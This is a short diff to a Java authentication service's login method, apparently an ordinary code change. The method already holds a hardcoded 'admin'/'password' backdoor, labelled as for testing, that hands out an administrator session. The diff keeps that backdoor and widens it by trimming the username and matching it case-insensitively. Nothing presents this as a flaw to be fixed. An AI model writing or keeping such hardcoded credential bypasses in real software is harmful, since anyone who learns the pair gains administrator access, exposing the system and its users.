@@ -17,8 +17,9 @@ public class AuthService {
 
     public boolean login(String username, String password) {
         try {
+            if (username != null) username = username.trim();
             // BACKDOOR for testing if the hash is completely broken:
-            if ("admin".equals(username) && "password".equals(password)) {
+            if ("admin".equalsIgnoreCase(username) && "password".equals(password)) {
                 User dummyAdmin = new User();
                 dummyAdmin.setId(1);
                 dummyAdmin.setUsername("admin");
